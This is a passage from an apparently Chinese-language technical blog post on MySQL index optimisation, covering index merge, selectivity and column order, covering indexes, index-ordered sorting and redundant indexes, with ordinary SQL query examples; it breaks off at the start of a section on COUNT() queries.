class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select film_id,actor_id from film_actor <span class="built_in">where</span> actor_id = 1</span><br><span class="line">union all</span><br><span class="line">select film_id,actor_id from film_actor <span class="built_in">where</span> film_id = 1 and actor_id &lt;&gt; 1</span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>&#x5F53;&#x51FA;&#x73B0;&#x591A;&#x4E2A;&#x7D22;&#x5F15;&#x505A;&#x76F8;&#x4EA4;&#x64CD;&#x4F5C;&#x65F6;&#xFF08;&#x591A;&#x4E2A; AND &#x6761;&#x4EF6;&#xFF09;&#xFF0C;&#x901A;&#x5E38;&#x6765;&#x8BF4;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6240;&#x6709;&#x76F8;&#x5173;&#x5217;&#x7684;&#x7D22;&#x5F15;&#x8981;&#x4F18;&#x4E8E;&#x591A;&#x4E2A;&#x72EC;&#x7ACB;&#x7D22;&#x5F15;&#x3002;</li><li>&#x5F53;&#x51FA;&#x73B0;&#x591A;&#x4E2A;&#x7D22;&#x5F15;&#x505A;&#x8054;&#x5408;&#x64CD;&#x4F5C;&#x65F6;&#xFF08;&#x591A;&#x4E2A; OR &#x6761;&#x4EF6;&#xFF09;&#xFF0C;&#x5BF9;&#x7ED3;&#x679C;&#x96C6;&#x7684;&#x5408;&#x5E76;&#x3001;&#x6392;&#x5E8F;&#x7B49;&#x64CD;&#x4F5C;&#x9700;&#x8981;&#x8017;&#x8D39;&#x5927;&#x91CF;&#x7684; CPU &#x548C;&#x5185;&#x5B58;&#x8D44;&#x6E90;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x5F53;&#x5176;&#x4E2D;&#x7684;&#x67D0;&#x4E9B;&#x7D22;&#x5F15;&#x7684;&#x9009;&#x62E9;&#x6027;&#x4E0D;&#x9AD8;&#xFF0C;&#x9700;&#x8981;&#x8FD4;&#x56DE;&#x5408;&#x5E76;&#x5927;&#x91CF;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x67E5;&#x8BE2;&#x6210;&#x672C;&#x66F4;&#x9AD8;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x8FD8;&#x4E0D;&#x5982;&#x8D70;&#x5168;&#x8868;&#x626B;&#x63CF;&#x3002;</li></ul><p>&#x56E0;&#x6B64;explain&#x65F6;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x6709;&#x7D22;&#x5F15;&#x5408;&#x5E76;&#xFF08;Extra &#x5B57;&#x6BB5;&#x51FA;&#x73B0;Using union&#xFF09;&#xFF0C;&#x5E94;&#x8BE5;&#x597D;&#x597D;&#x68C0;&#x67E5;&#x4E00;&#x4E0B;&#x67E5;&#x8BE2;&#x548C;&#x8868;&#x7ED3;&#x6784;&#x662F;&#x4E0D;&#x662F;&#x5DF2;&#x7ECF;&#x662F;&#x6700;&#x4F18;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x548C;&#x8868;&#x90FD;&#x6CA1;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x90A3;&#x53EA;&#x80FD;&#x8BF4;&#x660E;&#x7D22;&#x5F15;&#x5EFA;&#x7684;&#x975E;&#x5E38;&#x7CDF;&#x7CD5;&#xFF0C;&#x5E94;&#x5F53;&#x614E;&#x91CD;&#x8003;&#x8651;&#x7D22;&#x5F15;&#x662F;&#x5426;&#x5408;&#x9002;&#xFF0C;&#x6709;&#x53EF;&#x80FD;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6240;&#x6709;&#x76F8;&#x5173;&#x5217;&#x7684;&#x591A;&#x5217;&#x7D22;&#x5F15;&#x66F4;&#x9002;&#x5408;&#x3002;</p><p>&#x524D;&#x9762;&#x6211;&#x4EEC;&#x63D0;&#x5230;&#x8FC7;&#x7D22;&#x5F15;&#x5982;&#x4F55;&#x7EC4;&#x7EC7;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7684;&#xFF0C;&#x4ECE;&#x56FE;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x591A;&#x5217;&#x7D22;&#x5F15;&#x65F6;&#xFF0C;&#x7D22;&#x5F15;&#x7684;&#x987A;&#x5E8F;&#x5BF9;&#x4E8E;&#x67E5;&#x8BE2;&#x662F;&#x81F3;&#x5173;&#x91CD;&#x8981;&#x7684;&#xFF0C;&#x5F88;&#x660E;&#x663E;&#x5E94;&#x8BE5;&#x628A;&#x9009;&#x62E9;&#x6027;&#x66F4;&#x9AD8;&#x7684;&#x5B57;&#x6BB5;&#x653E;&#x5230;&#x7D22;&#x5F15;&#x7684;&#x524D;&#x9762;&#xFF0C;&#x8FD9;&#x6837;&#x901A;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x5C31;&#x53EF;&#x4EE5;&#x8FC7;&#x6EE4;&#x6389;&#x5927;&#x591A;&#x6570;&#x4E0D;&#x7B26;&#x5408;&#x6761;&#x4EF6;&#x7684;&#x6570;&#x636E;&#x3002;</p><blockquote><p>&#x7D22;&#x5F15;&#x9009;&#x62E9;&#x6027;&#x662F;&#x6307;&#x4E0D;&#x91CD;&#x590D;&#x7684;&#x7D22;&#x5F15;&#x503C;&#x548C;&#x6570;&#x636E;&#x8868;&#x7684;&#x603B;&#x8BB0;&#x5F55;&#x6570;&#x7684;&#x6BD4;&#x503C;&#xFF0C;&#x9009;&#x62E9;&#x6027;&#x8D8A;&#x9AD8;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#x8D8A;&#x9AD8;&#xFF0C;&#x56E0;&#x4E3A;&#x9009;&#x62E9;&#x6027;&#x8D8A;&#x9AD8;&#x7684;&#x7D22;&#x5F15;&#x53EF;&#x4EE5;&#x8BA9; MySQL &#x5728;&#x67E5;&#x8BE2;&#x65F6;&#x8FC7;&#x6EE4;&#x6389;&#x66F4;&#x591A;&#x7684;&#x884C;&#x3002;&#x552F;&#x4E00;&#x7D22;&#x5F15;&#x7684;&#x9009;&#x62E9;&#x6027;&#x662F; 1&#xFF0C;&#x8FD9;&#x662F;&#x6700;&#x597D;&#x7684;&#x7D22;&#x5F15;&#x9009;&#x62E9;&#x6027;&#xFF0C;&#x6027;&#x80FD;&#x4E5F;&#x662F;&#x6700;&#x597D;&#x7684;&#x3002;</p></blockquote><p>&#x7406;&#x89E3;&#x7D22;&#x5F15;&#x9009;&#x62E9;&#x6027;&#x7684;&#x6982;&#x5FF5;&#x540E;&#xFF0C;&#x5C31;&#x4E0D;&#x96BE;&#x786E;&#x5B9A;&#x54EA;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x9009;&#x62E9;&#x6027;&#x8F83;&#x9AD8;&#x4E86;&#xFF0C;&#x67E5;&#x4E00;&#x4E0B;&#x5C31;&#x77E5;&#x9053;&#x4E86;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM payment <span class="built_in">where</span> staff_id = 2 and customer_id = 584</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x662F;&#x5E94;&#x8BE5;&#x521B;&#x5EFA;<code>(staff_id,customer_id)</code>&#x7684;&#x7D22;&#x5F15;&#x8FD8;&#x662F;&#x5E94;&#x8BE5;&#x98A0;&#x5012;&#x4E00;&#x4E0B;&#x987A;&#x5E8F;&#xFF1F;&#x6267;&#x884C;&#x4E0B;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x54EA;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x9009;&#x62E9;&#x6027;&#x66F4;&#x63A5;&#x8FD1; 1 &#x5C31;&#x628A;&#x54EA;&#x4E2A;&#x5B57;&#x6BB5;&#x7D22;&#x5F15;&#x524D;&#x9762;&#x5C31;&#x597D;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select count(distinct staff_id)/count(*) as staff_id_selectivity,</span><br><span class="line">       count(distinct customer_id)/count(*) as customer_id_selectivity,</span><br><span class="line">       count(*) from payment</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x539F;&#x5219;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x4ECD;&#x7136;&#x6CE8;&#x610F;&#x4F60;&#x7684;&#x6570;&#x636E;&#x4E2D;&#x662F;&#x5426;&#x5B58;&#x5728;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x3002;&#x4E3E;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x6BD4;&#x5982;&#x8981;&#x67E5;&#x8BE2;&#x67D0;&#x4E2A;&#x7528;&#x6237;&#x7EC4;&#x4E0B;&#x6709;&#x8FC7;&#x4EA4;&#x6613;&#x7684;&#x7528;&#x6237;&#x4FE1;&#x606F;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user_id from trade <span class="built_in">where</span> user_group_id = 1 and trade_amount &gt; 0</span><br></pre></td></tr></tbody></table></figure><p></p><p>MySQL &#x4E3A;&#x8FD9;&#x4E2A;&#x67E5;&#x8BE2;&#x9009;&#x62E9;&#x4E86;&#x7D22;&#x5F15;<code>(user_group_id,trade_amount)</code>&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x8003;&#x8651;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#xFF0C;&#x8FD9;&#x770B;&#x8D77;&#x6765;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x662F;&#x8FD9;&#x5F20;&#x8868;&#x7684;&#x5927;&#x591A;&#x6570;&#x6570;&#x636E;&#x90FD;&#x662F;&#x4ECE;&#x8001;&#x7CFB;&#x7EDF;&#x4E2D;&#x8FC1;&#x79FB;&#x8FC7;&#x6765;&#x7684;&#xFF0C;&#x7531;&#x4E8E;&#x65B0;&#x8001;&#x7CFB;&#x7EDF;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x517C;&#x5BB9;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x7ED9;&#x8001;&#x7CFB;&#x7EDF;&#x8FC1;&#x79FB;&#x8FC7;&#x6765;&#x7684;&#x6570;&#x636E;&#x8D4B;&#x4E88;&#x4E86;&#x4E00;&#x4E2A;&#x9ED8;&#x8BA4;&#x7684;&#x7528;&#x6237;&#x7EC4;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x901A;&#x8FC7;&#x7D22;&#x5F15;&#x626B;&#x63CF;&#x7684;&#x884C;&#x6570;&#x8DDF;&#x5168;&#x8868;&#x626B;&#x63CF;&#x57FA;&#x672C;&#x6CA1;&#x4EC0;&#x4E48;&#x533A;&#x522B;&#xFF0C;&#x7D22;&#x5F15;&#x4E5F;&#x5C31;&#x8D77;&#x4E0D;&#x5230;&#x4EFB;&#x4F55;&#x4F5C;&#x7528;&#x3002;</p><p>&#x63A8;&#x5E7F;&#x5F00;&#x6765;&#x8BF4;&#xFF0C;&#x7ECF;&#x9A8C;&#x6CD5;&#x5219;&#x548C;&#x63A8;&#x8BBA;&#x5728;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x6709;&#x7528;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x5BFC;&#x6211;&#x4EEC;&#x5F00;&#x53D1;&#x548C;&#x8BBE;&#x8BA1;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x5F80;&#x5F80;&#x4F1A;&#x66F4;&#x590D;&#x6742;&#xFF0C;&#x5B9E;&#x9645;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x4E0B;&#x7684;&#x67D0;&#x4E9B;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x53EF;&#x80FD;&#x4F1A;&#x6467;&#x6BC1;&#x4F60;&#x7684;&#x6574;&#x4E2A;&#x8BBE;&#x8BA1;&#x3002;</p><p><strong>&#x907F;&#x514D;&#x591A;&#x4E2A;&#x8303;&#x56F4;&#x6761;&#x4EF6;</strong></p><p>&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x7ECF;&#x5E38;&#x4F7F;&#x7528;&#x591A;&#x4E2A;&#x8303;&#x56F4;&#x6761;&#x4EF6;&#xFF0C;&#x6BD4;&#x5982;&#x60F3;&#x67E5;&#x8BE2;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#x6BB5;&#x5185;&#x767B;&#x5F55;&#x8FC7;&#x7684;&#x7528;&#x6237;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user.* from user <span class="built_in">where</span> login_time &gt; <span class="string">&apos;2017-04-01&apos;</span> and age between 18 and 30;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x67E5;&#x8BE2;&#x6709;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;&#x5B83;&#x6709;&#x4E24;&#x4E2A;&#x8303;&#x56F4;&#x6761;&#x4EF6;&#xFF0C;login_time &#x5217;&#x548C; age &#x5217;&#xFF0C;MySQL &#x53EF;&#x4EE5;&#x4F7F;&#x7528; login_time &#x5217;&#x7684;&#x7D22;&#x5F15;&#x6216;&#x8005; age &#x5217;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x4F46;&#x65E0;&#x6CD5;&#x540C;&#x65F6;&#x4F7F;&#x7528;&#x5B83;&#x4EEC;&#x3002;</p><p><strong>&#x8986;&#x76D6;&#x7D22;&#x5F15;</strong></p><p>&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7D22;&#x5F15;&#x5305;&#x542B;&#x6216;&#x8005;&#x8BF4;&#x8986;&#x76D6;&#x6240;&#x6709;&#x9700;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x518D;&#x56DE;&#x8868;&#x67E5;&#x8BE2;&#xFF0C;&#x8FD9;&#x5C31;&#x79F0;&#x4E3A;&#x8986;&#x76D6;&#x7D22;&#x5F15;&#x3002;&#x8986;&#x76D6;&#x7D22;&#x5F15;&#x662F;&#x975E;&#x5E38;&#x6709;&#x7528;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x4EE5;&#x6781;&#x5927;&#x7684;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#xFF0C;&#x56E0;&#x4E3A;&#x67E5;&#x8BE2;&#x53EA;&#x9700;&#x8981;&#x626B;&#x63CF;&#x7D22;&#x5F15;&#x4F1A;&#x5E26;&#x6765;&#x8BB8;&#x591A;&#x597D;&#x5904;&#xFF1A;</p><ul><li>&#x7D22;&#x5F15;&#x6761;&#x76EE;&#x8FDC;&#x5C0F;&#x4E8E;&#x6570;&#x636E;&#x884C;&#x5927;&#x5C0F;&#xFF0C;&#x5982;&#x679C;&#x53EA;&#x8BFB;&#x53D6;&#x7D22;&#x5F15;&#xFF0C;&#x6781;&#x5927;&#x51CF;&#x5C11;&#x6570;&#x636E;&#x8BBF;&#x95EE;&#x91CF;</li><li>&#x7D22;&#x5F15;&#x662F;&#x6709;&#x6309;&#x7167;&#x5217;&#x503C;&#x987A;&#x5E8F;&#x5B58;&#x50A8;&#x7684;&#xFF0C;&#x5BF9;&#x4E8E; I/O &#x5BC6;&#x96C6;&#x578B;&#x7684;&#x8303;&#x56F4;&#x67E5;&#x8BE2;&#x8981;&#x6BD4;&#x968F;&#x673A;&#x4ECE;&#x78C1;&#x76D8;&#x8BFB;&#x53D6;&#x6BCF;&#x4E00;&#x884C;&#x6570;&#x636E;&#x7684; IO &#x8981;&#x5C11;&#x7684;&#x591A;</li></ul><p><strong>&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x626B;&#x63CF;&#x6765;&#x6392;&#x5E8F;</strong></p><p>MySQL &#x6709;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;&#x53EF;&#x4EE5;&#x751F;&#x4EA7;&#x6709;&#x5E8F;&#x7684;&#x7ED3;&#x679C;&#x96C6;&#xFF0C;&#x5176;&#x4E00;&#x662F;&#x5BF9;&#x7ED3;&#x679C;&#x96C6;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5176;&#x4E8C;&#x662F;&#x6309;&#x7167;&#x7D22;&#x5F15;&#x987A;&#x5E8F;&#x626B;&#x63CF;&#x5F97;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x81EA;&#x7136;&#x662F;&#x6709;&#x5E8F;&#x7684;&#x3002;&#x5982;&#x679C; explain &#x7684;&#x7ED3;&#x679C;&#x4E2D;type&#x5217;&#x7684;&#x503C;&#x4E3A;index&#x8868;&#x793A;&#x4F7F;&#x7528;&#x4E86;&#x7D22;&#x5F15;&#x626B;&#x63CF;&#x6765;&#x505A;&#x6392;&#x5E8F;&#x3002;</p><p>&#x626B;&#x63CF;&#x7D22;&#x5F15;&#x672C;&#x8EAB;&#x5F88;&#x5FEB;&#xFF0C;&#x56E0;&#x4E3A;&#x53EA;&#x9700;&#x8981;&#x4ECE;&#x4E00;&#x6761;&#x7D22;&#x5F15;&#x8BB0;&#x5F55;&#x79FB;&#x52A8;&#x5230;&#x76F8;&#x90BB;&#x7684;&#x4E0B;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#x3002;&#x4F46;&#x5982;&#x679C;&#x7D22;&#x5F15;&#x672C;&#x8EAB;&#x4E0D;&#x80FD;&#x8986;&#x76D6;&#x6240;&#x6709;&#x9700;&#x8981;&#x67E5;&#x8BE2;&#x7684;&#x5217;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4E0D;&#x5F97;&#x4E0D;&#x6BCF;&#x626B;&#x63CF;&#x4E00;&#x6761;&#x7D22;&#x5F15;&#x8BB0;&#x5F55;&#x5C31;&#x56DE;&#x8868;&#x67E5;&#x8BE2;&#x4E00;&#x6B21;&#x5BF9;&#x5E94;&#x7684;&#x884C;&#x3002;&#x8FD9;&#x4E2A;&#x8BFB;&#x53D6;&#x64CD;&#x4F5C;&#x57FA;&#x672C;&#x4E0A;&#x662F;&#x968F;&#x673A; I/O&#xFF0C;&#x56E0;&#x6B64;&#x6309;&#x7167;&#x7D22;&#x5F15;&#x987A;&#x5E8F;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x7684;&#x901F;&#x5EA6;&#x901A;&#x5E38;&#x8981;&#x6BD4;&#x987A;&#x5E8F;&#x5730;&#x5168;&#x8868;&#x626B;&#x63CF;&#x8981;&#x6162;&#x3002;</p><p>&#x5728;&#x8BBE;&#x8BA1;&#x7D22;&#x5F15;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7D22;&#x5F15;&#x65E2;&#x80FD;&#x591F;&#x6EE1;&#x8DB3;&#x6392;&#x5E8F;&#xFF0C;&#x53C8;&#x6EE1;&#x8DB3;&#x67E5;&#x8BE2;&#xFF0C;&#x662F;&#x6700;&#x597D;&#x7684;&#x3002;</p><p>&#x53EA;&#x6709;&#x5F53;&#x7D22;&#x5F15;&#x7684;&#x5217;&#x987A;&#x5E8F;&#x548C;ORDER BY&#x5B50;&#x53E5;&#x7684;&#x987A;&#x5E8F;&#x5B8C;&#x5168;&#x4E00;&#x81F4;&#xFF0C;&#x5E76;&#x4E14;&#x6240;&#x6709;&#x5217;&#x7684;&#x6392;&#x5E8F;&#x65B9;&#x5411;&#x4E5F;&#x4E00;&#x6837;&#x65F6;&#xFF0C;&#x624D;&#x80FD;&#x591F;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x6765;&#x5BF9;&#x7ED3;&#x679C;&#x505A;&#x6392;&#x5E8F;&#x3002;&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x9700;&#x8981;&#x5173;&#x8054;&#x591A;&#x5F20;&#x8868;&#xFF0C;&#x5219;&#x53EA;&#x6709;ORDER BY&#x5B50;&#x53E5;&#x5F15;&#x7528;&#x7684;&#x5B57;&#x6BB5;&#x5168;&#x90E8;&#x4E3A;&#x7B2C;&#x4E00;&#x5F20;&#x8868;&#x65F6;&#xFF0C;&#x624D;&#x80FD;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x505A;&#x6392;&#x5E8F;&#x3002;ORDER BY&#x5B50;&#x53E5;&#x548C;&#x67E5;&#x8BE2;&#x7684;&#x9650;&#x5236;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x90FD;&#x8981;&#x6EE1;&#x8DB3;&#x6700;&#x5DE6;&#x524D;&#x7F00;&#x7684;&#x8981;&#x6C42;&#xFF08;&#x6709;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#x4F8B;&#x5916;&#xFF0C;&#x5C31;&#x662F;&#x6700;&#x5DE6;&#x7684;&#x5217;&#x88AB;&#x6307;&#x5B9A;&#x4E3A;&#x5E38;&#x6570;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x793A;&#x4F8B;&#xFF09;&#xFF0C;&#x5176;&#x4ED6;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x9700;&#x8981;&#x6267;&#x884C;&#x6392;&#x5E8F;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x7D22;&#x5F15;&#x6392;&#x5E8F;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- &#x6700;&#x5DE6;&#x5217;&#x4E3A;&#x5E38;&#x6570;&#xFF0C;&#x7D22;&#x5F15;&#xFF1A;(date,staff_id,customer_id)</span><br><span class="line">select  staff_id,customer_id from demo <span class="built_in">where</span> date = <span class="string">&apos;2015-06-01&apos;</span> order by staff_id,customer_id</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x5197;&#x4F59;&#x548C;&#x91CD;&#x590D;&#x7D22;&#x5F15;</strong></p><p>&#x5197;&#x4F59;&#x7D22;&#x5F15;&#x662F;&#x6307;&#x5728;&#x76F8;&#x540C;&#x7684;&#x5217;&#x4E0A;&#x6309;&#x7167;&#x76F8;&#x540C;&#x7684;&#x987A;&#x5E8F;&#x521B;&#x5EFA;&#x7684;&#x76F8;&#x540C;&#x7C7B;&#x578B;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x5E94;&#x5F53;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x8FD9;&#x79CD;&#x7D22;&#x5F15;&#xFF0C;&#x53D1;&#x73B0;&#x540E;&#x7ACB;&#x5373;&#x5220;&#x9664;&#x3002;&#x6BD4;&#x5982;&#x6709;&#x4E00;&#x4E2A;&#x7D22;&#x5F15;<code>(A,B)</code>&#xFF0C;&#x518D;&#x521B;&#x5EFA;&#x7D22;&#x5F15;<code>(A)</code>&#x5C31;&#x662F;&#x5197;&#x4F59;&#x7D22;&#x5F15;&#x3002;&#x5197;&#x4F59;&#x7D22;&#x5F15;&#x7ECF;&#x5E38;&#x53D1;&#x751F;&#x5728;&#x4E3A;&#x8868;&#x6DFB;&#x52A0;&#x65B0;&#x7D22;&#x5F15;&#x65F6;&#xFF0C;&#x6BD4;&#x5982;&#x6709;&#x4EBA;&#x65B0;&#x5EFA;&#x4E86;&#x7D22;&#x5F15;<code>(A,B)</code>&#xFF0C;&#x4F46;&#x8FD9;&#x4E2A;&#x7D22;&#x5F15;&#x4E0D;&#x662F;&#x6269;&#x5C55;&#x5DF2;&#x6709;&#x7684;&#x7D22;&#x5F15;<code>(A)</code>&#x3002;</p><p>&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x5E94;&#x8BE5;&#x5C3D;&#x91CF;&#x6269;&#x5C55;&#x5DF2;&#x6709;&#x7684;&#x7D22;&#x5F15;&#x800C;&#x4E0D;&#x662F;&#x521B;&#x5EFA;&#x65B0;&#x7D22;&#x5F15;&#x3002;&#x4F46;&#x6709;&#x6781;&#x5C11;&#x60C5;&#x51B5;&#x4E0B;&#x51FA;&#x73B0;&#x6027;&#x80FD;&#x65B9;&#x9762;&#x7684;&#x8003;&#x8651;&#x9700;&#x8981;&#x5197;&#x4F59;&#x7D22;&#x5F15;&#xFF0C;&#x6BD4;&#x5982;&#x6269;&#x5C55;&#x5DF2;&#x6709;&#x7D22;&#x5F15;&#x800C;&#x5BFC;&#x81F4;&#x5176;&#x53D8;&#x5F97;&#x8FC7;&#x5927;&#xFF0C;&#x4ECE;&#x800C;&#x5F71;&#x54CD;&#x5230;&#x5176;&#x4ED6;&#x4F7F;&#x7528;&#x8BE5;&#x7D22;&#x5F15;&#x7684;&#x67E5;&#x8BE2;&#x3002;</p><p><strong>&#x5220;&#x9664;&#x957F;&#x671F;&#x672A;&#x4F7F;&#x7528;&#x7684;&#x7D22;&#x5F15;</strong></p><p>&#x5B9A;&#x671F;&#x5220;&#x9664;&#x4E00;&#x4E9B;&#x957F;&#x65F6;&#x95F4;&#x672A;&#x4F7F;&#x7528;&#x8FC7;&#x7684;&#x7D22;&#x5F15;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x597D;&#x7684;&#x4E60;&#x60EF;&#x3002;</p><p>&#x5173;&#x4E8E;&#x7D22;&#x5F15;&#x8FD9;&#x4E2A;&#x8BDD;&#x9898;&#x6253;&#x7B97;&#x5C31;&#x6B64;&#x6253;&#x4F4F;&#xFF0C;&#x6700;&#x540E;&#x8981;&#x8BF4;&#x4E00;&#x53E5;&#xFF0C;&#x7D22;&#x5F15;&#x5E76;&#x4E0D;&#x603B;&#x662F;&#x6700;&#x597D;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x53EA;&#x6709;&#x5F53;&#x7D22;&#x5F15;&#x5E2E;&#x52A9;&#x63D0;&#x9AD8;&#x67E5;&#x8BE2;&#x901F;&#x5EA6;&#x5E26;&#x6765;&#x7684;&#x597D;&#x5904;&#x5927;&#x4E8E;&#x5176;&#x5E26;&#x6765;&#x7684;&#x989D;&#x5916;&#x5DE5;&#x4F5C;&#x65F6;&#xFF0C;&#x7D22;&#x5F15;&#x624D;&#x662F;&#x6709;&#x6548;&#x7684;&#x3002;&#x5BF9;&#x4E8E;&#x975E;&#x5E38;&#x5C0F;&#x7684;&#x8868;&#xFF0C;&#x7B80;&#x5355;&#x7684;&#x5168;&#x8868;&#x626B;&#x63CF;&#x66F4;&#x9AD8;&#x6548;&#x3002;&#x5BF9;&#x4E8E;&#x4E2D;&#x5230;&#x5927;&#x578B;&#x7684;&#x8868;&#xFF0C;&#x7D22;&#x5F15;&#x5C31;&#x975E;&#x5E38;&#x6709;&#x6548;&#x3002;&#x5BF9;&#x4E8E;&#x8D85;&#x5927;&#x578B;&#x7684;&#x8868;&#xFF0C;&#x5EFA;&#x7ACB;&#x548C;&#x7EF4;&#x62A4;&#x7D22;&#x5F15;&#x7684;&#x4EE3;&#x4EF7;&#x968F;&#x4E4B;&#x589E;&#x957F;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x5176;&#x4ED6;&#x6280;&#x672F;&#x4E5F;&#x8BB8;&#x66F4;&#x6709;&#x6548;&#xFF0C;&#x6BD4;&#x5982;&#x5206;&#x533A;&#x8868;&#x3002;&#x6700;&#x540E;&#x7684;&#x6700;&#x540E;&#xFF0C;<strong>explain&#x540E;&#x518D;&#x63D0;&#x6D4B;&#x662F;&#x4E00;&#x79CD;&#x7F8E;&#x5FB7;</strong>&#x3002;</p><p><strong>&#x7279;&#x5B9A;&#x7C7B;&#x578B;&#x67E5;&#x8BE2;&#x4F18;&#x5316;</strong></p><p><strong>&#x4F18;&#x5316; COUNT() &#x67E5;&#x8BE2;</strong></p><p><code>COUNT()</code>&#x53EF;&#x80FD;&#x662F;&#x88AB;&#x5927;&#x5BB6;&#x8BEF;&#x89E3;&#x6700;&#x591A;&#x7684;&#x51FD;&#x6570;&#x4E86;&#xFF0C;&#x5B83;&#x6709;&#x4E24;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x5176;&#x4E00;&#x662F;&#x7EDF;&#x8BA1;&#x67D0;&#x4E2A;&#x5217;&#x503C;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x5176;&#x4E8C;&#x662F;&#x7EDF;&#x8BA1;&#x884C;&#x6570;&#x3002;&#x7EDF;&#x8BA1;&#x5217;&#x503C;&#x65F6;&#xFF0C;&#x8981;&#x6C42;&#x5217;&#x503C;&#x662F;&#x975E;&#x7A7A;&#x7684;&#xFF0C;&#x5B83;&#x4E0D;&#x4F1A;&#x7EDF;&#x8BA1; 